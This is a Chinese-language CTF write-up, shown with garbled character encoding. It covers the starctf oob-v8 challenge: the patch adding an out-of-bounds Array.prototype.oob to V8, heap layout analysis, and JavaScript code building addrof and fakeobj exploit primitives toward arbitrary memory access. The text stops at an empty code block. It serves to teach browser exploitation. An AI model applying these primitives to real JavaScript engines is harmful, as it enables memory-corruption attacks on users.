---
title: "CTF oob-v8"
---

å‚ç…§ [starctf-oob-v8-indepth](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) å®Œæˆ CTF é¢˜ç›® oob-v8ï¼Œå­¦ä¹  v8 æ¼æ´åˆ©ç”¨ã€‚

## å‡†å¤‡

å‚ç…§[å®˜æ–¹æ–‡æ¡£](https://v8.dev/docs/build)å‡†å¤‡ v8 çš„æ„å»ºç¯å¢ƒã€‚

---

**â„¹ï¸NOTE**: æœ‰ Chromium çš„æ„å»ºç¯å¢ƒè¯ï¼ŒæŠŠæ„å»ºå‘½ä»¤æ”¹æˆ `autoninja -C out\Default\ d8` å°±å¯ä»¥æ„å»º d8.exeã€‚

---

## é¢˜ç›®

é¢˜ç›®ä¿®æ”¹äº† v8 æºç ï¼Œç»™æ•°ç»„æ·»åŠ äº†ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•° `oob`ã€‚

```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}

 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

è¿™æ®µä»£ç å®šä¹‰äº† builtins å‡½æ•° `ArrayOob`ï¼ŒæŠŠå®ƒèµ‹å€¼åˆ° `Array.prototype.oob`ã€‚

é‡ç‚¹åˆ†æä¸‹ `ArrayOob` å‡½æ•°çš„å®ç°ï¼š

- æ£€æŸ¥å‚æ•°æ•°é‡ï¼Œè¶…è¿‡ä¸¤ä¸ªç›´æ¥è¿”å› `undefined`ã€‚ \
  `args` ä¸­å­˜å‚¨ç€ builtins å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œå¯ä»¥çœ‹åšå­˜æ”¾äº† `args.length()` ä¸ªå¯¹è±¡çš„æ•°ç»„ã€‚
- ä» `args` ä¸­å–å¾—ç‰¹æ®Šçš„å‚æ•° `receiver`ã€‚ \
  `receiver` å°±ç›¸å½“äº JavsScript å‡½æ•°ä¸­çš„ this å¯¹è±¡ã€‚ \
  `Handle\<receiver\>` ä¸­çš„ `Handle` å¯ä»¥çœ‹åšæ™ºèƒ½æŒ‡é’ˆã€‚
- æŠŠ `receiver` å½“åšæµ®ç‚¹æ•°æ•°ç»„ä½¿ç”¨ï¼Œè·å–æ•°ç»„çš„ç¼“å†²åŒº `elements`ã€‚
- å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ï¼šè¯»å– `elements` ä¸‹æ ‡ `array->length()` å¤„å­˜æ”¾çš„å€¼ã€‚
- å¦‚æœæœ‰ä¸¤ä¸ªå‚æ•°ï¼šå‚æ•° 2 å†™å…¥ `elements` ä¸‹æ ‡ `array->length()` å¤„ï¼Œè¿”å› `undefined`ã€‚

`array->length()` è¿”å›çš„æ˜¯æ•°ç»„ `array` çš„å…ƒç´ æ•°é‡ï¼Œæ•°ç»„ç´¢å¼•çš„æœ‰æ•ˆèŒƒå›´æ˜¯ \[0, array->length())ï¼Œè®¿é—®ç´¢å¼• `array->length()` å±äºè¶Šç•Œè®¿é—®ã€‚

æˆ‘å·²ç»æœ‰ç°æˆçš„ v8 æ„å»ºç¯å¢ƒï¼Œå°±æ²¡æœ‰ä¸‹è½½åŸé¢˜ï¼Œè€Œæ˜¯åœ¨éšä¾¿ä¸€ä¸ª COMMIT ä¸Šä¾ç…§ PATCH ä¿®æ”¹ä»£ç ï¼Œæ„å»ºå‡º d8.exeã€‚ï¼ˆCOMMIT ID 185badc9122fe6274c1b2fe54e03fda5315cb80eï¼‰

æµ‹è¯• `oob` å‡½æ•°æ˜¯å¦èƒ½æ­£å¸¸ä½¿ç”¨ï¼š

---

**â„¹ï¸NOTE**: ä½¿ç”¨ Release ç‰ˆçš„ d8.exeï¼ŒDebug ç‰ˆä¼šè§¦å‘æ–­è¨€ã€‚

---

```bash
> d8.exe
V8 version 9.4.0 (candidate)
d8> a = [0]
[0]
d8> a.oob()
1.380041495160898e-269
d8> a.oob(1)
undefined
```

## åˆ©ç”¨

ç¯å¢ƒå‡†å¤‡å¥½ä»¥åï¼Œå¼€å§‹å†™åˆ©ç”¨ä»£ç ï¼ŒJavaScript æ¼æ´åˆ©ç”¨ï¼Œæ˜¯å¯ä»¥å¥—ç”¨ä¸€ä¸ªå›ºå®šæ¨¡å¼çš„ï¼š

å…ˆæ„é€ å‡º addrof å’Œ fakeobj ä¸¤ä¸ªæ“ä½œï¼Œå°±å¯ä»¥åˆ›å»ºå‡ºæŒ‡å‘ä»»æ„åœ°å€çš„ `ArrayBuffer` å¯¹è±¡ï¼Œå®ç°ä»»æ„å†…å­˜è¯»ã€å†™ã€‚

- fakeobj: ä¼ªé€ ä»»æ„çš„JSå¯¹è±¡
- addrof: è¯»å–ä»»æ„ JavaScript å¯¹è±¡çš„åœ°å€

æœ‰äº†ä»»æ„å†…å­˜è¯»ã€å†™ï¼Œåˆ©ç”¨ WASM æ¨¡å—å¯¼å‡ºå‡½æ•°æ‰€åœ¨çš„å†…å­˜é¡µé¢æ˜¯ RWX çš„è¿™ä¸€ç‰¹æ€§ï¼ŒæŠŠå‡½æ•°æŒ‡ä»¤ä¿®æ”¹æˆ shellcodeï¼Œä¹‹åå†è°ƒç”¨å‡½æ•°ï¼Œå°±ç›¸å½“äºæ‰§è¡Œ shellcodeã€‚

### å†…å­˜å¸ƒå±€

è¦å®ç° addrof å’Œ fakeobjï¼Œå…ˆè¦è§‚å¯Ÿç¨‹åºçš„å†…å­˜å¸ƒå±€ï¼Œåˆ†æé€šè¿‡æ¼æ´èƒ½è¶Šç•Œè®¿é—®åˆ°çš„æ•°æ®ã€‚è¿™é‡Œç”¨ d8.exe æä¾›äº†è°ƒè¯•å‡½æ•° `%DebugPrint` è¾“å‡ºå¯¹è±¡çš„å†…å­˜åœ°å€ï¼Œåœ¨ç”¨è°ƒè¯•å™¨æŸ¥çœ‹å†…å­˜æ•°æ®ï¼Œä½¿ç”¨ `%DebugPrint` éœ€è¦åœ¨å¯åŠ¨ d8 æ—¶æŒ‡å®š \--natives-syntax å‘½ä»¤ã€‚

```bash
> d8.exe --allow-natives-syntax
V8 version 9.4.0 (candidate)
d8> a = [1.1, 1.2]
[1.1, 1.2]
d8> %DebugPrint(a)
DebugPrint: 000003D40810A6F9: [JSArray]
 - map: 0x03d4082c3ae1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x03d40828bebd <JSArray[0]>
 - elements: 0x03d40810a6e1 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x03d40800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    000003D4080048F1: [String] in ReadOnlySpace: #length: 0x03d40820215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x03d40810a6e1 <FixedDoubleArray[2]> {
           0: 1.1
           1: 1.2
 }
000003D4082C3AE1: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x03d4082c3ab9 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x03d408202405 <Cell value= 1>
 - instance descriptors #1: 0x03d40828c38d <DescriptorArray[1]>
 - transitions #1: 0x03d40828c3d9 <TransitionArray[4]>Transition array #1:
     0x03d408005229 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x03d4082c3b09 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x03d40828bebd <JSArray[0]>
 - constructor: 0x03d40828bc4d <JSFunction Array (sfi = 000003D40820FE71)>
 - dependent code: 0x03d4080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 1.2]
```

ç¬¬ä¸€è¡Œ `DebugPrint: 000003D40810A6F9: [JSArray]` æ˜¯æŒ‡ a åœ¨å†…å­˜ä¸­çš„æŒ‡é’ˆæ˜¯ `000003D40810A6F9`ï¼Œæ•°æ®ç±»å‹æ˜¯ `JSArray`ã€‚

`0x000003D40810A6F9` ä½œä¸ºä¸€ä¸ªå¯¹è±¡çš„èµ·å§‹åœ°å€æ˜¯æœ‰ç‚¹å¥‡æ€ªçš„ï¼Œä¸€èˆ¬æ¥è¯´å†…å­˜å—èµ·å§‹åœ°å€éƒ½æ˜¯æŒ‰ 4 æˆ– 8 å¯¹é½çš„ï¼Œä¸ä¼šå‡ºç°ä¸€ä¸ªå¯¹è±¡ä»å¥‡æ•°åœ°å€å¼€å§‹çš„æƒ…å†µã€‚è¿™æ˜¯å› ä¸º `0x000003D40810A6F9` ä¸¥æ ¼æ¥è¯´å¹¶ä¸æ˜¯ `a` çš„æŒ‡é’ˆï¼Œè€Œæ˜¯æ ‡è®°æŒ‡é’ˆï¼ˆTagged pointerï¼‰ã€‚

æ ‡è®°æŒ‡é’ˆæ˜¯ä¼˜åŒ–åçš„æŒ‡é’ˆï¼Œv8 æ˜¯åœ¨ä¸€ä¸ªå¾ˆå°çš„èŒƒå›´å†…åˆ†é…çš„å¯¹è±¡çš„å†…å­˜ï¼Œ64 ä½åœ°å€çš„é«˜ 32 ä½éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸ºäº†å‡å°æŒ‡é’ˆçš„å†…å­˜å ç”¨ï¼Œv8 å°±åªå­˜å‚¨æŒ‡é’ˆçš„ä½ 32 ä½ã€‚è€Œä¸”å¯¹è±¡çš„æŒ‡é’ˆéƒ½æ˜¯å¯¹é½è¿‡çš„ï¼Œæœ€ä½ä½å›ºå®šä¸º 0ï¼Œå¯ä»¥ä½œä¸ºæ ‡å¿—ä½ä½¿ç”¨ã€‚æœ€ä½ä½ç½®ä½æ—¶ä»£è¡¨æ•°æ®ç±»å‹æ˜¯æ ‡è®°æŒ‡é’ˆï¼Œæ¸…é›¶ä»£è¡¨å­˜æ”¾çš„æ˜¯ Smiã€‚Smi æ˜¯å¯¹å°æ•´æ•°çš„ä¸€ç§ä¼˜åŒ–ï¼ŒæŠŠä¸€ä¸ªå°æ•´æ•°å·¦ç§»ä¸€ä½å°±å¾—åˆ°äº†å®ƒå¯¹åº”çš„ Smiã€‚æ›´å¤šå†…å®¹ï¼Œå‚è€ƒv8çš„[æ–‡æ¡£](https://v8.dev/blog/pointer-compression)ã€‚

æ‰€ä»¥ `a` çœŸå®çš„åœ°å€æ˜¯ `0x000003D40810A6F8`ï¼Œåœ¨è°ƒè¯•å™¨é‡ŒæŸ¥çœ‹å­˜å‚¨çš„æ•°æ®

![](</assets/images/Pasted image 20220203000947.png>)

`JSArray` å¯¹åº” CPP ä¸­çš„ `v8::internall::JSArray`ï¼Œé˜…è¯»ä»£ç å¾—çŸ¥å®ƒæœ‰ä»¥ä¸‹å‡ ä¸ªæˆå‘˜ï¼š

- map: å­˜æ”¾å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ï¼Œå¦‚ï¼šåŸå‹ã€å±æ€§å
- properties: å¯¹è±¡å±æ€§çš„æŒ‡é’ˆ
- elements: æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆ
- length: æ•°ç»„é•¿åº¦ (Smi)

å†çœ‹ä¸‹ elements å¤„çš„å†…å­˜å¸ƒå±€

![](</assets/images/Pasted image 20220203001131.png>)

elements æŒ‡å‘çš„æ˜¯ä½œä¸ºç¼“å†²åŒºä½¿ç”¨çš„ FixedArray å¯¹è±¡ï¼ŒåŒ…å«ï¼š

- map
- length
- å†…åµŒçš„ç¼“å†²åŒº

æŒ‰åŒç²¾åº¦æµ®ç‚¹æ•°æ˜¾ç¤ºï¼Œå°±å¯ä»¥çœ‹åˆ°å­˜æ”¾åœ¨æ•°ç»„ä¸­çš„ 1.1, 1.2 ä¸¤ä¸ªæµ®ç‚¹æ•°ã€‚

![](</assets/images/Pasted image 20220203001306.png>)

è¶Šç•Œè®¿é—®åˆ°çš„å°±æ˜¯è·Ÿåœ¨ 1.2 ä¹‹åçš„å€¼ï¼Œä¹Ÿå°±æ˜¯ `0x99993d49810a6f8` èµ·å§‹çš„ 8 å­—èŠ‚å†…å­˜ã€‚è¿™åˆšå¥½å°±æ˜¯ `a` çš„èµ·å§‹åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯ `a` çš„ map å’Œ propertiesï¼Œæµ‹è¯•å‡ æ¬¡å‘ç°éƒ½æ˜¯è¿™æ ·çš„ã€‚è¿™æ ·çš„è¯è¶Šç•Œè®¿é—®å°±å¯ä»¥è¯»ã€å†™æµ®ç‚¹æ•°ç»„çš„ map å’Œ propertiesã€‚

---

**â„¹ï¸NOTE**: æ·±å…¥åˆ†æçš„è¯ï¼Œä¼šå‘ç°åœ¨æ•°ç»„çš„åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œè¿™ä¸¤ä¸ªå†…å­˜å—æ˜¯ç´§æ¥åœ¨ä¸€èµ·çº¿æ€§åˆ†é…çš„ï¼Œåœ¨æ•°ç»„å¤§å°é€‰å–çš„åˆé€‚æƒ…å†µä¸‹ï¼Œå†…å­˜åœ°å€ä¸€å®šæ˜¯ç›¸è¿çš„ã€‚

---

### addrof

map ä¸­å­˜æ”¾äº†å…³äºå¯¹è±¡ç±»å‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚åŸå‹ï¼Œå±æ€§ç­‰ã€‚æŠŠæµ®ç‚¹æ•°æ•°ç»„çš„ map æ›¿æ¢æˆå¯¹è±¡æ•°ç»„çš„ï¼Œv8 è§£é‡Šå™¨å°±ä¼šæŠŠå®ƒå½“åšå¯¹è±¡æ•°ç»„ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œé€šè¿‡å¦‚ä¸‹æ“ä½œå°±å¯ä»¥è¯»åˆ°å¯¹è±¡çš„æŒ‡é’ˆï¼š

- æµ®ç‚¹æ•°ç»„ map æ”¹æˆå¯¹è±¡æ•°ç»„
- å¯¹è±¡å­˜å…¥æ•°ç»„çš„æŒ‡å®šä½ç½®ï¼Œå­˜å…¥çš„ç¼“å†²åŒºçš„æ•°æ®ï¼Œå®é™…ä¸Šå¯¹è±¡çš„æŒ‡é’ˆ
- å†æŠŠ map æ¢å¤å›å»
- æŠŠæŒ‡é’ˆå½“åšæµ®ç‚¹æ•°ä»æ•°ç»„è¯»å‡º

ç›®å‰å·²ç»å¯ä»¥è¯»ã€å†™æµ®ç‚¹æ•°ç»„ mapï¼Œåªè¦å†æ‰¾åˆ°è¯»å–å¯¹è±¡æ•°ç»„ map çš„æ–¹æ³•ï¼Œaddrof å°±å¯ä»¥å®ç°äº†ã€‚

è§‚å¯Ÿä¸‹å¯¹è±¡æ•°ç»„çš„å†…å­˜å¸ƒå±€ï¼Œçœ‹çœ‹å¯¹è±¡æ•°ç»„çš„è¶Šç•Œè®¿é—®èƒ½è¯»åˆ°ä»€ä¹ˆï¼š

```bash
d8> obj = {}
{}
d8> let arr2 = [obj]
undefined
d8> %DebugPrint(arr2)
DebugPrint: 000003C00810B071: [JSArray]
 - map: 0x03c0082c3b31 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x03c00828bebd <JSArray[0]>
 - elements: 0x03c00810b065 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x03c00800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    000003C0080048F1: [String] in ReadOnlySpace: #length: 0x03c00820215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x03c00810b065 <FixedArray[1]> {
           0: 0x03c00810afad <Object map = 000003C0082C22D1>
 }
000003C0082C3B31: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x03c0082c3b09 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x03c008202405 <Cell value= 1>
 - instance descriptors #1: 0x03c00828c38d <DescriptorArray[1]>
 - transitions #1: 0x03c00828c409 <TransitionArray[4]>Transition array #1:
     0x03c008005229 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x03c0082c3b59 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x03c00828bebd <JSArray[0]>
 - constructor: 0x03c00828bc4d <JSFunction Array (sfi = 000003C00820FE71)>
 - dependent code: 0x03c0080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[{}]
```

æŸ¥çœ‹å†…å­˜æ•°æ®ï¼š

![](</assets/images/Pasted image 20220213221256.png>)

å¯¹è±¡æ•°ç»„çš„å…ƒç´ æ˜¯ 4 å­—èŠ‚çš„æ ‡è®°æŒ‡é’ˆï¼Œè€Œ `oob` å‡½æ•°æ˜¯æŠŠæ•°ç»„å…ƒç´ å½“åš 8 å­—èŠ‚çš„æµ®ç‚¹æ•°å¤„ç†çš„ï¼Œè¿™ä½¿å¾—å¯¹è±¡æ•°ç»„çš„ `oob` æ˜¯ä¸èƒ½ç›´æ¥è¯»å–åˆ° map çš„ã€‚

ä¸è¿‡éšç€æ•°ç»„å…ƒç´ æ•°é‡çš„å¢åŠ ï¼Œ`oob` èƒ½è¯»åˆ°çš„ä½ç½®æ˜¯åœ¨å‘ä¸‹ç§»åŠ¨çš„ï¼Œæœ€ç»ˆä¸€å®šä¼šè¶Šè¿‡å¯¹è±¡æ•°ç»„çš„æ‰€åœ¨çš„åŒºåŸŸï¼Œè¯»åˆ°é«˜åœ°å€å¤„å…¶ä»–çš„å€¼ã€‚å¦‚æœæˆ‘ä»¬å…ˆåœ¨åé¢çš„å†…å­˜ä¸­å¸ƒå±€å…¶å®ƒçš„å¯¹è±¡æ•°ç»„ï¼Œå°±æœ‰å¯èƒ½è¯»åˆ°å…¶å®ƒå¯¹è±¡æ•°ç»„çš„ mapã€‚

ç»è¿‡ç®€å•çš„è®¡ç®—å’Œå°è¯•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„æ–¹æ¡ˆï¼šåˆ›å»ºç›¸é‚»çš„ä¸¤ä¸ªå¯¹è±¡æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæ•°ç»„æœ‰ 8 ä¸ªå…ƒç´ ï¼Œç¬¬äºŒä¸ªæ•°ç»„æœ‰ 2 ä¸ªå…ƒç´ ã€‚ç¬¬ä¸€ä¸ªæ•°ç»„çš„ `oob` å‡½æ•°åˆšå¥½å°±å¯ä»¥è¯»åˆ°ç¬¬äºŒä¸ªæ•°ç»„çš„ Map å€¼ã€‚

```bash
d8> arr2 = [obj, obj, obj, obj, obj, obj, obj, obj];arr3=[obj,obj]
[{}, {}]
d8> %DebugPrint(arr2)
DebugPrint: 000003C00810B239: [JSArray]
 - map: 0x03c0082c3b31 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x03c00828bebd <JSArray[0]>
 - elements: 0x03c00810b211 <FixedArray[8]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x03c00800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    000003C0080048F1: [String] in ReadOnlySpace: #length: 0x03c00820215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x03c00810b211 <FixedArray[8]> {
         0-7: 0x03c00810afad <Object map = 000003C0082C22D1>
 }
000003C0082C3B31: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x03c0082c3b09 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x03c008202405 <Cell value= 1>
 - instance descriptors #1: 0x03c00828c38d <DescriptorArray[1]>
 - transitions #1: 0x03c00828c409 <TransitionArray[4]>Transition array #1:
     0x03c008005229 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x03c0082c3b59 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x03c00828bebd <JSArray[0]>
 - constructor: 0x03c00828bc4d <JSFunction Array (sfi = 000003C00820FE71)>
 - dependent code: 0x03c0080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[{}, {}, {}, {}, {}, {}, {}, {}]
d8> %DebugPrint(arr3)
DebugPrint: 000003C00810B259: [JSArray]
 - map: 0x03c0082c3b31 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x03c00828bebd <JSArray[0]>
 - elements: 0x03c00810b249 <FixedArray[2]> [PACKED_ELEMENTS]
 - length: 2
 - properties: 0x03c00800222d <FixedArray[0]>
 - All own properties (excluding elements): {
    000003C0080048F1: [String] in ReadOnlySpace: #length: 0x03c00820215d <AccessorInfo> (const accessor descriptor), location: descriptor
 }
 - elements: 0x03c00810b249 <FixedArray[2]> {
         0-1: 0x03c00810afad <Object map = 000003C0082C22D1>
 }
000003C0082C3B31: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x03c0082c3b09 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x03c008202405 <Cell value= 1>
 - instance descriptors #1: 0x03c00828c38d <DescriptorArray[1]>
 - transitions #1: 0x03c00828c409 <TransitionArray[4]>Transition array #1:
     0x03c008005229 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x03c0082c3b59 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x03c00828bebd <JSArray[0]>
 - constructor: 0x03c00828bc4d <JSFunction Array (sfi = 000003C00820FE71)>
 - dependent code: 0x03c0080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[{}, {}]
```

æŸ¥çœ‹å†…å­˜ï¼š

![](</assets/images/Pasted image 20220213224048.png>)

å¯¹ç¬¬ä¸€ä¸ªæ•°ç»„è°ƒç”¨ `oob`ï¼Œè®¿é—®çš„å†…å­˜ä¸º `0x000003C00810B218 + 0x8 * 0x8 => 0x000003C00810B258`ï¼Œåˆšå¥½æ˜¯ç¬¬äºŒä¸ªæ•°ç»„çš„ map æ‰€åœ¨çš„ä½ç½®ã€‚

addrof ä»£ç å®ç°å¦‚ä¸‹ï¼š

```javascript
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigInt64Array(buf);

function ftoi(f) {
	f64[0] = f;
	return i64[0]
}

function itof(i) {
	i64[0] = i;
	return f64[0];
}

function zero_high_word(i) {
	return i & BigInt("0x00000000ffffffff");
}

function get_map_double_array() {
	let arr = [1.1, 1.2, 1.3]
	return zero_high_word(ftoi(arr.oob()));
}

function get_map_obj_array() {
  let obj = {};
  let arr1 = [obj, obj, obj, obj, obj, obj, obj, obj];
  let arr2 = [obj, obj];
  // arr1.oob will read arr2's map
  return zero_high_word(ftoi(arr1.oob()));
}

function modify_double_arr_map(arr, new_map) {
  old_v = ftoi(arr.oob());
  new_v = old_v & BigInt('0xffffffff0000000') | new_map;
  arr.oob(itof(new_v));
}

double_array_map = get_map_double_array();
obj_array_map = get_map_obj_array();

console.log(double_array_map.toString(16));
console.log(obj_array_map.toString(16));

let arr = [1.1, 1.2, 1.3];

let obj = {}
modify_double_arr_map(arr, obj_array_map)
arr[2] = obj;
modify_double_arr_map(arr, double_array_map)
let addrofobj = ftoi(arr[1]) & BigInt("0x00000000ffffffff");

console.log(addrofobj.toString(16))
```

`oob` å‡½æ•°çš„è¿”å›å€¼æ˜¯æµ®ç‚¹å‹çš„ï¼Œä¸ºäº†æ–¹ä¾¿å¯¹å…¶è¿›è¡Œä½è¿ç®—ï¼Œéœ€è¦å®ç°äº†ç±»å‹è½¬æ¢å‡½æ•° `ftoi`ã€`itof`ã€‚

éªŒè¯ä¸‹æ•ˆæœï¼š

---

**â„¹ï¸NOTE**: ä½¿ç”¨Release ç‰ˆçš„ d8.exe

---

```bash
./d8.exe --allow-natives-syntax
V8 version 9.4.0 (candidate)
d8> load("poc.js")
8203ae1
8203b31
8049901
undefined
d8> %DebugPrint(obj)
0x023108049901 <Object map = 00000231082022D1>
{}
```

### fakeobj

æŠŠä¿®æ”¹ map é¡ºåºå˜æ¢ä¸€ä¸‹ï¼Œå°±å¯ä»¥å®ç° fakeobj:

- æŠŠæŒ‡é’ˆè½¬æ¢æˆæµ®ç‚¹æ•°ï¼Œå­˜å…¥æµ®ç‚¹æ•°ç»„
- æµ®ç‚¹æ•°ç»„çš„ map æ”¹æˆå¯¹è±¡æ•°ç»„çš„
- æŠŠåˆšå­˜å…¥çš„æŒ‡é’ˆå½“æˆå¯¹è±¡è¯»å‡ºã€‚
- æ¢å¤ map

```javascript
function fakeobj(tagged_ptr) {
  arr[0] = itof(tagged_ptr)
  modify_double_arr_map(arr, obj_array_map)
  res = arr[0]
  modify_double_arr_map(arr, double_array_map)
  return res;
}
```

å¯ä»¥ç”¨æ•°ç»„æ„é€  `tagged_ptr` æŒ‡å‘çš„å†…å­˜ï¼š

```javascript
function addrof(obj) {
  modify_double_arr_map(arr, obj_array_map)
  arr[2] = obj;
  modify_double_arr_map(arr, double_array_map)

  return ftoi(arr[1]) & BigInt("0x00000000ffffffff");
}

// fake a double Array
arr_contains_fake_obj = [itof(make_qword(double_array_map, 0)), itof(make_qword(double_array_map, 6 << 1)), 1.3];
%DebugPrint(arr_contains_fake_obj);
fixed_arr_ends = arr_begin = addrof(arr_contains_fake_obj);
console.log(fixed_arr_ends.toString(16));

// è·å–fakeobjçš„èµ·å§‹åœ°å€
fake_obj_tagged_ptr = fixed_arr_ends - BigInt(3 * 8);
console.log(fake_obj_tagged_ptr.toString(16));
```

åˆšå¥½åœ¨ä¸‹å›¾çº¢è‰²æ¡†å‡ºçš„åŒºåŸŸæ„é€ å‡ºäº†å¯ä»¥ä½œä¸ºæµ®ç‚¹æ•°ç»„ä½¿ç”¨çš„å†…å­˜ã€‚

![](</assets/images/Pasted image 20220219175057.png>)

è¿™ä¸ªä¼ªé€ çš„æ•°ç»„ï¼š

- mapï¼šæµ®ç‚¹æ•°ç»„ map `0x08203ae1`
- propertiesï¼š`0` ä¸ä¼šç”¨åˆ°
- elementsï¼š `0x0820eae1`ï¼Œ åªæ˜¯éšä¾¿é€‰äº†ä¸€ä¸ªå¯è®¿é—®çš„å†…å­˜ï¼Œæ²¡æœ‰ç‰¹æ®Šéœ€è¦
- lengthï¼š`0xc` => `6` çš„ Smi å½¢å¼ã€‚

`arr_contains_fake_obj` çš„åœ°å€å‡å» 24 å°±å¯ä»¥æ˜¯çº¢æ¡†çš„èµ·å§‹åœ°å€ï¼ŒæŠŠè¿™ä¸ªèµ·å§‹åœ°å€è½¬æ¢æˆ tagged pointer å°±å¯ä»¥ç”¨ä½œ `fakeobj` å‡½æ•°çš„å‚æ•°ã€‚

éªŒè¯ä¸‹æ•ˆæœï¼š

```javascript
